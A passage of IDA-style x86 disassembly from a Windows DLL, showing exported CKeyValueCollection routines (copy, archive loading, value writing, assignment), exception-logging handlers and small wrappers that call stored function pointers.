		call	dword ptr [eax+98h]
		test	al, al
		jz	short loc_6AF3667F
		mov	eax, [edi]
		lea	ecx, [ebp+var_14]
		push	ecx
		push	[ebp+var_4]
		mov	ecx, edi
		call	dword ptr [eax+14h]
		test	al, al
		jz	short loc_6AF36694
		mov	eax, [edi]
		lea	ecx, [ebp+var_18]
		push	ecx
		push	[ebp+var_4]
		mov	ecx, edi
		call	dword ptr [eax+10h]
		test	al, al
		jz	short loc_6AF36694
		mov	eax, [esi]
		lea	ecx, [ebp+var_10]
		push	ecx
		push	[ebp+var_4]
		mov	ecx, esi
		call	dword ptr [eax+0Ch]
		test	al, al
		jz	short loc_6AF36686
		push	[ebp+var_10]
		mov	ecx, esi
		push	[ebp+var_14]
		push	[ebp+var_18]
		push	[ebp+var_4]
		push	edi
		call	Ordinal301
		test	al, al
		jz	short loc_6AF3668D
		inc	[ebp+arg_0]
		mov	eax, [ebp+arg_0]
		cmp	eax, [ebp+var_8]
		jb	short loc_6AF365F1

loc_6AF36660:				; CODE XREF: Ordinal212+6Fj
		mov	byte ptr [esi+8], 1
		mov	bl, 1

loc_6AF36666:				; CODE XREF: Ordinal212+3Fj
					; Ordinal212+126j
		lea	ecx, [ebp+var_C]
		call	sub_6AF37896
		lea	ecx, [ebp+var_24]
		call	Ordinal1230
		pop	edi
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	4
; ---------------------------------------------------------------------------

loc_6AF3667F:				; CODE XREF: Ordinal212+85j
		push	offset aCkeyvaluecol_7 ; "CKeyValueCollection::Copy() :	pKeyValue"...
		jmp	short loc_6AF36699
; ---------------------------------------------------------------------------

loc_6AF36686:				; CODE XREF: Ordinal212+BBj
		push	offset aCkeyvaluecol_8 ; "CKeyValueCollection::Copy() :	GetWriteV"...
		jmp	short loc_6AF36699
; ---------------------------------------------------------------------------

loc_6AF3668D:				; CODE XREF: Ordinal212+D3j
		push	offset aCkeyvaluecol_9 ; "CKeyValueCollection::Copy() :	CopyValue"...
		jmp	short loc_6AF36699
; ---------------------------------------------------------------------------

loc_6AF36694:				; CODE XREF: Ordinal212+97j
					; Ordinal212+A9j
		push	offset aCkeyvalueco_10 ; "CKeyValueCollection::Copy() :	pValueCol"...

loc_6AF36699:				; CODE XREF: Ordinal212+104j
					; Ordinal212+10Bj ...
		call	sub_6AF3102E
		pop	ecx
		mov	ecx, esi
		call	Ordinal211
		jmp	short loc_6AF36666
Ordinal212	endp

; Exported entry 217.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal217
Ordinal217	proc near		; DATA XREF: .rdata:6AF56100o
					; .rdata:off_6AF66098o

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	edi
		mov	[ebp+var_4], ecx
		call	Ordinal211
		mov	edi, [ebp+arg_0]
		mov	ecx, [ebp+var_4]
		push	edi
		call	Ordinal296
		test	al, al
		jnz	short loc_6AF366D9
		push	offset aCkeyvalueco_11 ; "CKeyValueCollection::LoadArchive() : CV"...
		call	sub_6AF3102E
		pop	ecx
		xor	al, al
		jmp	loc_6AF3678E
; ---------------------------------------------------------------------------

loc_6AF366D9:				; CODE XREF: Ordinal217+1Dj
		push	esi		; Args
		lea	eax, [ebp+var_8]
		xor	esi, esi
		push	eax
		mov	ecx, edi
		mov	[ebp+var_8], esi
		call	Ordinal329
		test	eax, eax
		jnz	short loc_6AF36700
		push	offset aCkeyvalueco_12 ; "CKeyValueCollection::LoadArchive() : Ar"...
		call	sub_6AF3102E
		pop	ecx
		xor	al, al
		jmp	loc_6AF3678D
; ---------------------------------------------------------------------------

loc_6AF36700:				; CODE XREF: Ordinal217+44j
		mov	eax, [ebp+var_8]
		dec	eax
		push	ebx		; Args
		mov	bl, 1
		jz	short loc_6AF36710
		push	offset aCkeyvalueco_13 ; "CKeyValueCollection::LoadArchive() : sw"...
		jmp	short loc_6AF3677A
; ---------------------------------------------------------------------------

loc_6AF36710:				; CODE XREF: Ordinal217+5Fj
		lea	eax, [ebp+arg_0]
		push	eax
		mov	ecx, edi
		mov	[ebp+arg_0], esi
		call	Ordinal323
		test	eax, eax
		jz	short loc_6AF36767
		cmp	[ebp+arg_0], esi
		mov	[ebp+var_C], esi
		mov	[ebp+var_10], esi
		jbe	short loc_6AF3678A

loc_6AF3672D:				; CODE XREF: Ordinal217+BBj
		lea	eax, [ebp+var_C]
		push	eax
		mov	ecx, edi
		call	Ordinal323
		test	eax, eax
		jz	short loc_6AF36767
		mov	ecx, [ebp+var_4]
		mov	eax, [ecx]
		lea	edx, [ebp+var_10]
		push	edx
		push	[ebp+var_C]
		call	dword ptr [eax+0Ch]
		test	al, al
		jz	short loc_6AF3676E
		push	[ebp+var_10]
		mov	ecx, [ebp+var_4]
		push	edi
		call	Ordinal299
		test	al, al
		jz	short loc_6AF36775
		inc	esi
		cmp	esi, [ebp+arg_0]
		jb	short loc_6AF3672D
		jmp	short loc_6AF3678A
; ---------------------------------------------------------------------------

loc_6AF36767:				; CODE XREF: Ordinal217+78j
					; Ordinal217+92j
		push	offset aCkeyvalueco_12 ; "CKeyValueCollection::LoadArchive() : Ar"...
		jmp	short loc_6AF3677A
; ---------------------------------------------------------------------------

loc_6AF3676E:				; CODE XREF: Ordinal217+A5j
		push	offset aCkeyvalueco_14 ; "CKeyValueCollection::LoadArchive() : Ge"...
		jmp	short loc_6AF3677A
; ---------------------------------------------------------------------------

loc_6AF36775:				; CODE XREF: Ordinal217+B5j
		push	offset aCkeyvalueco_15 ; "CKeyValueCollection::LoadArchive() : Lo"...

loc_6AF3677A:				; CODE XREF: Ordinal217+66j
					; Ordinal217+C4j ...
		call	sub_6AF3102E
		pop	ecx
		mov	ecx, [ebp+var_4]
		xor	bl, bl
		call	Ordinal211

loc_6AF3678A:				; CODE XREF: Ordinal217+83j
					; Ordinal217+BDj
		mov	al, bl
		pop	ebx

loc_6AF3678D:				; CODE XREF: Ordinal217+53j
		pop	esi

loc_6AF3678E:				; CODE XREF: Ordinal217+2Cj
		pop	edi
		leave
		retn	4
Ordinal217	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF36793	proc near		; CODE XREF: Ordinal216+42p

var_A4		= byte ptr -0A4h
var_9C		= byte ptr -9Ch
var_54		= byte ptr -54h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	eax, offset unknown_libname_43 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 98h
		push	ebx
		mov	ebx, [ebp+arg_0]
		push	esi
		push	edi
		push	ebx
		mov	edi, ecx
		call	sub_6AF35AF2
		mov	esi, eax
		cmp	esi, [edi+4]
		jz	short loc_6AF367BF
		mov	eax, [ebx]
		cmp	eax, [esi+10h]
		jnb	short loc_6AF367FE

loc_6AF367BF:				; CODE XREF: sub_6AF36793+23j
		lea	ecx, [ebp+var_54]
		call	Ordinal245
		and	[ebp+var_4], 0
		push	eax
		push	ebx
		lea	ecx, [ebp+var_A4]
		call	sub_6AF359A6
		push	eax
		push	esi
		lea	eax, [ebp+arg_0]
		push	eax
		mov	ecx, edi
		mov	byte ptr [ebp+var_4], 1
		call	sub_6AF36397
		mov	esi, [eax]
		lea	ecx, [ebp+var_9C]
		call	Ordinal246
		lea	ecx, [ebp+var_54]
		call	Ordinal246

loc_6AF367FE:				; CODE XREF: sub_6AF36793+2Aj
		mov	ecx, [ebp+var_C]
		pop	edi
		lea	eax, [esi+18h]
		pop	esi
		pop	ebx
		mov	large fs:0, ecx
		leave
		retn	4
sub_6AF36793	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF36812	proc near		; CODE XREF: Ordinal208+4Dp

var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		mov	esi, ecx
		cmp	esi, [ebp+arg_0]
		jz	short loc_6AF3683A
		mov	eax, [esi+4]
		mov	ecx, [eax]
		push	eax		; int
		push	ecx		; void *
		lea	eax, [ebp+var_4]
		push	eax		; int
		mov	ecx, esi
		call	sub_6AF36472
		push	[ebp+arg_0]
		mov	ecx, esi
		call	sub_6AF364C5

loc_6AF3683A:				; CODE XREF: sub_6AF36812+Aj
		mov	eax, esi
		pop	esi
		leave
		retn	4
sub_6AF36812	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_6AF36841	proc near		; CODE XREF: Ordinal206+11p
		jmp	sub_6AF36523
sub_6AF36841	endp

; Exported entry 206.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal206
Ordinal206	proc near		; CODE XREF: sub_6AF369C0+3p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF560F0
		call	Ordinal211
		lea	ecx, [esi+78h]
		call	sub_6AF36841
		mov	ecx, esi
		pop	esi
		jmp	Ordinal257
Ordinal206	endp

; Exported entry 216.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal216
Ordinal216	proc near		; DATA XREF: .rdata:6AF560FCo
					; .rdata:off_6AF66098o

var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= byte ptr -48h
var_28		= dword	ptr -28h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= byte ptr  8
arg_4		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_44 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 44h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		mov	esi, [ebp+arg_4]
		and	dword ptr [esi], 0
		push	edi
		mov	edi, ecx
		mov	[ebp+var_10], esp
		push	offset aCkeyvalueco_16 ; "CKeyValueCollection::GetWriteValue()"
		lea	ecx, [ebp+var_48]
		mov	[ebp+var_14], eax
		mov	[ebp+var_28], edi
		call	Ordinal751
		and	[ebp+var_4], 0
		lea	eax, [ebp+arg_0]
		push	eax
		lea	ecx, [edi+78h]
		mov	byte ptr [ebp+var_4], 1
		call	sub_6AF36793
		mov	[esi], eax
		jmp	loc_6AF36950
; ---------------------------------------------------------------------------

loc_6AF368B2:				; DATA XREF: .rdata:6AF62620o
		push	13h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	ecx, [ebp+var_50]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3694A
		retn
; ---------------------------------------------------------------------------

loc_6AF368F5:				; DATA XREF: .rdata:6AF62630o
		push	15h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	eax, [ebp+var_4C]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3694A
		retn
; ---------------------------------------------------------------------------

loc_6AF3694A:				; DATA XREF: Ordinal216+8Bo
					; Ordinal216+E0o
		mov	edi, [ebp+var_28]
		mov	esi, [ebp+arg_4]

loc_6AF36950:				; CODE XREF: Ordinal216+49j
		lea	ecx, [ebp+var_48]
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF36975
		mov	ecx, [esi]
		test	ecx, ecx
		jz	short loc_6AF36975
		call	Ordinal250
		mov	eax, [esi]
		mov	byte ptr [eax+44h], 1
		mov	byte ptr [edi+8], 1
		mov	bl, 1
		jmp	short loc_6AF36977
; ---------------------------------------------------------------------------

loc_6AF36975:				; CODE XREF: Ordinal216+F6j
					; Ordinal216+FCj
		xor	bl, bl

loc_6AF36977:				; CODE XREF: Ordinal216+10Fj
		lea	ecx, [ebp+var_48]
		call	Ordinal752
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	al, bl
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
Ordinal216	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_6AF3699A	proc near		; CODE XREF: Ordinal205+11p
					; Ordinal207+11p
		push	esi
		mov	esi, ecx
		call	sub_6AF35D14
		mov	eax, esi
		pop	esi
		retn
sub_6AF3699A	endp

; Exported entry 205.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal205
Ordinal205	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal256
		lea	ecx, [esi+78h]
		mov	dword ptr [esi], offset	off_6AF560F0
		call	sub_6AF3699A
		mov	eax, esi
		pop	esi
		retn
Ordinal205	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF369C0(void *, char)
sub_6AF369C0	proc near		; DATA XREF: .rdata:off_6AF560F0o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal206
		test	[esp+4+arg_0], 1
		jz	short loc_6AF369D6
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF369D6:				; CODE XREF: sub_6AF369C0+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF369C0	endp

; Exported entry 208.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal208
Ordinal208	proc near		; CODE XREF: Ordinal207+1Cp
					; DATA XREF: .rdata:off_6AF66098o

var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= byte ptr -48h
var_28		= dword	ptr -28h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	eax, offset unknown_libname_45 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 44h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		mov	esi, ecx
		cmp	esi, edi
		mov	[ebp+var_14], eax
		mov	[ebp+var_10], esp
		mov	[ebp+var_28], esi
		jz	loc_6AF36AD6
		push	edi
		call	Ordinal259
		push	offset aCkeyvalueco_17 ; "CKeyValueCollection::operator	=()"
		lea	ecx, [ebp+var_48]
		call	Ordinal751
		and	[ebp+var_4], 0
		add	edi, 78h
		lea	ecx, [esi+78h]
		push	edi
		mov	byte ptr [ebp+var_4], 1
		call	sub_6AF36812
		jmp	loc_6AF36ACE
; ---------------------------------------------------------------------------

loc_6AF36A33:				; DATA XREF: .rdata:6AF62688o
		push	13h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	ecx, [ebp+var_50]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF36ACB
		retn
; ---------------------------------------------------------------------------

loc_6AF36A76:				; DATA XREF: .rdata:6AF62698o
		push	15h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	eax, [ebp+var_4C]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF36ACB
		retn
; ---------------------------------------------------------------------------

loc_6AF36ACB:				; DATA XREF: Ordinal208+94o
					; Ordinal208+E9o
		mov	esi, [ebp+var_28]

loc_6AF36ACE:				; CODE XREF: Ordinal208+52j
		lea	ecx, [ebp+var_48]
		call	Ordinal752

loc_6AF36AD6:				; CODE XREF: Ordinal208+25j
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	eax, esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal208	endp ; sp-analysis failed

; Exported entry 207.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal207
Ordinal207	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal256
		lea	ecx, [esi+78h]
		mov	dword ptr [esi], offset	off_6AF560F0
		call	sub_6AF3699A
		push	[esp+4+arg_0]
		mov	ecx, esi
		call	Ordinal208
		mov	eax, esi
		pop	esi
		retn	4
Ordinal207	endp

; Exported entry 219.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal219
Ordinal219	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal185
Ordinal219	endp

; Exported entry 220.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal220
Ordinal220	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal193
Ordinal220	endp

; Exported entry 221.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal221
Ordinal221	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal191
Ordinal221	endp

; Exported entry 222.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal222
Ordinal222	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal197
Ordinal222	endp

; Exported entry 223.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal223
Ordinal223	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal199
Ordinal223	endp

; Exported entry 224.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal224
Ordinal224	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal201
Ordinal224	endp

; Exported entry 225.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal225
Ordinal225	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal203
Ordinal225	endp

; Exported entry 226.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal226(LPSTR lpBuffer, int)
		public Ordinal226
Ordinal226	proc near		; DATA XREF: .rdata:off_6AF66098o

lpBuffer	= dword	ptr  4
arg_4		= dword	ptr  8

		push	[esp+arg_4]	; int
		push	[esp+4+lpBuffer] ; lpBuffer
		call	Ordinal1183
		neg	eax
		pop	ecx
		sbb	eax, eax
		pop	ecx
		neg	eax
		retn
Ordinal226	endp

; Exported entry 227.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal227(LPSTR lpBuffer, int)
		public Ordinal227
Ordinal227	proc near		; DATA XREF: .rdata:off_6AF66098o

lpBuffer	= dword	ptr  4
arg_4		= dword	ptr  8

		push	[esp+arg_4]	; int
		push	[esp+4+lpBuffer] ; lpBuffer
		call	Ordinal1185
		neg	eax
		pop	ecx
		sbb	eax, eax
		pop	ecx
		neg	eax
		retn
Ordinal227	endp

; Exported entry 228.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal228
Ordinal228	proc near		; DATA XREF: .rdata:off_6AF66098o

lpString1	= dword	ptr  4
arg_4		= dword	ptr  8

		push	[esp+arg_4]	; int
		push	[esp+4+lpString1] ; lpString1
		call	Ordinal1187
		neg	eax
		pop	ecx
		sbb	eax, eax
		pop	ecx
		neg	eax
		retn
Ordinal228	endp

; Exported entry 229.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal229
Ordinal229	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, ecx
		xor	ecx, ecx
		mov	dword ptr [eax], offset	off_6AF56154
		mov	[eax+4], ecx
		mov	[eax+8], ecx
		mov	[eax+0Ch], ecx
		mov	[eax+10h], ecx
		mov	[eax+14h], ecx
		mov	[eax+18h], ecx
		mov	[eax+1Ch], ecx
		mov	[eax+20h], ecx
		mov	[eax+24h], ecx
		mov	[eax+28h], ecx
		mov	[eax+2Ch], ecx
		mov	[eax+30h], ecx
		retn
Ordinal229	endp

; Exported entry 233.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal233
Ordinal233	proc near		; CODE XREF: Ordinal230+9p
					; Ordinal232+1Fp
					; DATA XREF: ...
		push	esi
		mov	esi, ecx
		mov	ecx, [esi+4]
		test	ecx, ecx
		jz	short loc_6AF36BC7
		mov	eax, [esi+10h]
		test	eax, eax
		jz	short loc_6AF36BC7
		push	ecx
		call	eax
		and	dword ptr [esi+4], 0
		mov	[esi+8], eax

loc_6AF36BC7:				; CODE XREF: Ordinal233+8j
					; Ordinal233+Fj
		xor	eax, eax
		cmp	[esi+8], eax
		pop	esi
		setz	al
		retn
Ordinal233	endp

; Exported entry 234.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal234
Ordinal234	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		mov	eax, [esi+18h]
		test	eax, eax
		jz	short loc_6AF36BF0
		push	[esp+4+arg_0]
		push	dword ptr [esi+4]
		call	eax
		xor	ecx, ecx
		test	eax, eax
		setz	cl
		mov	[esi+8], eax
		mov	eax, ecx

loc_6AF36BF0:				; CODE XREF: Ordinal234+8j
		pop	esi
		retn	4
Ordinal234	endp

; Exported entry 235.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal235
Ordinal235	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		mov	eax, [esi+1Ch]
		test	eax, eax
		jz	short loc_6AF36C13
		push	[esp+4+arg_0]
		push	dword ptr [esi+4]
		call	eax
		xor	ecx, ecx
		test	eax, eax
		setz	cl
		mov	[esi+8], eax
		mov	eax, ecx

loc_6AF36C13:				; CODE XREF: Ordinal235+8j
		pop	esi
		retn	4
Ordinal235	endp

; Exported entry 237.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal237
Ordinal237	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	esi
		mov	esi, ecx
		mov	eax, [esi+2Ch]
		test	eax, eax
		jz	short loc_6AF36C42
		push	[esp+4+arg_8]
		push	[esp+8+arg_4]
		push	0
		push	0
		push	[esp+14h+arg_0]
		push	dword ptr [esi+4]
		call	eax
		xor	ecx, ecx
		test	eax, eax
		setz	cl
		mov	[esi+8], eax
		mov	eax, ecx

loc_6AF36C42:				; CODE XREF: Ordinal237+8j
		pop	esi
		retn	0Ch
Ordinal237	endp

; Exported entry 238.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal238(int,	LPCSTR lpString, int)
		public Ordinal238
Ordinal238	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
lpString	= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+30h], 0
		jnz	short loc_6AF36C53
		xor	eax, eax
		jmp	short loc_6AF36C7F
; ---------------------------------------------------------------------------

loc_6AF36C53:				; CODE XREF: Ordinal238+7j
		push	[esp+4+lpString] ; lpString
		call	ds:lstrlenA
		inc	eax
		push	eax
		push	[esp+8+lpString]
		push	[esp+0Ch+arg_8]
		push	0
		push	[esp+14h+arg_0]
		push	dword ptr [esi+4]
		call	dword ptr [esi+30h]
		xor	ecx, ecx
		test	eax, eax
		setz	cl
		mov	[esi+8], eax
		mov	eax, ecx

loc_6AF36C7F:				; CODE XREF: Ordinal238+Bj
		pop	esi
		retn	0Ch
Ordinal238	endp

; Exported entry 239.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal239
Ordinal239	proc near		; DATA XREF: .rdata:off_6AF66098o

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		mov	esi, ecx
		mov	eax, [esi+2Ch]
		test	eax, eax
		jz	short loc_6AF36CB7
		lea	ecx, [ebp+var_4]
		push	ecx
		push	[ebp+arg_4]
		mov	[ebp+var_4], 4
		push	0
		push	0
		push	[ebp+arg_0]
		push	dword ptr [esi+4]
		call	eax
		xor	ecx, ecx
		test	eax, eax
		setz	cl
		mov	[esi+8], eax
		mov	eax, ecx

loc_6AF36CB7:				; CODE XREF: Ordinal239+Cj
		pop	esi
		leave
		retn	8
Ordinal239	endp

; Exported entry 240.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal240
Ordinal240	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= byte ptr  8

		push	esi
		mov	esi, ecx
		mov	eax, [esi+30h]
		test	eax, eax
		jz	short loc_6AF36CE6
		push	4
		lea	ecx, [esp+8+arg_4]
		push	ecx
		push	4
		push	0
		push	[esp+14h+arg_0]
		push	dword ptr [esi+4]
		call	eax
		xor	ecx, ecx
		test	eax, eax
		setz	cl
		mov	[esi+8], eax
		mov	eax, ecx

loc_6AF36CE6:				; CODE XREF: Ordinal240+8j
		pop	esi
		retn	8
Ordinal240	endp

; Exported entry 241.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal241
Ordinal241	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch
arg_18		= dword	ptr  20h

		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, ecx
		mov	eax, [esi+24h]
		test	eax, eax
		jnz	short loc_6AF36CFA
		inc	eax
		jmp	short loc_6AF36D17
; ---------------------------------------------------------------------------

loc_6AF36CFA:				; CODE XREF: Ordinal241+Bj
		push	[ebp+arg_18]
		push	[ebp+arg_14]
		push	[ebp+arg_10]
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		push	dword ptr [esi+4]
		call	eax
		mov	[esi+8], eax

loc_6AF36D17:				; CODE XREF: Ordinal241+Ej
		pop	esi
		pop	ebp
		retn	1Ch
Ordinal241	endp

; Exported entry 242.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal242
Ordinal242	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch
arg_18		= dword	ptr  20h

		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, ecx
		mov	eax, [esi+20h]
		test	eax, eax
		jnz	short loc_6AF36D2C
		inc	eax
		jmp	short loc_6AF36D49
; ---------------------------------------------------------------------------

loc_6AF36D2C:				; CODE XREF: Ordinal242+Bj
		push	[ebp+arg_18]
		push	[ebp+arg_14]
		push	[ebp+arg_10]
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		push	dword ptr [esi+4]
		call	eax
		mov	[esi+8], eax

loc_6AF36D49:				; CODE XREF: Ordinal242+Ej
		pop	esi
		pop	ebp
		retn	1Ch
Ordinal242	endp

; Exported entry 243.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal243
Ordinal243	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		mov	eax, [ecx+2Ch]
		test	eax, eax
		jnz	short loc_6AF36D5B
		inc	eax
		jmp	short loc_6AF36D6F
; ---------------------------------------------------------------------------

loc_6AF36D5B:				; CODE XREF: Ordinal243+8j
		push	[ebp+arg_10]
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		push	dword ptr [ecx+4]
		call	eax

loc_6AF36D6F:				; CODE XREF: Ordinal243+Bj
		pop	ebp
		retn	14h
Ordinal243	endp

; Exported entry 244.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal244
Ordinal244	proc near		; CODE XREF: Ordinal232+8p
					; DATA XREF: .rdata:off_6AF66098o

LibFileName	= byte ptr -108h
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 108h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
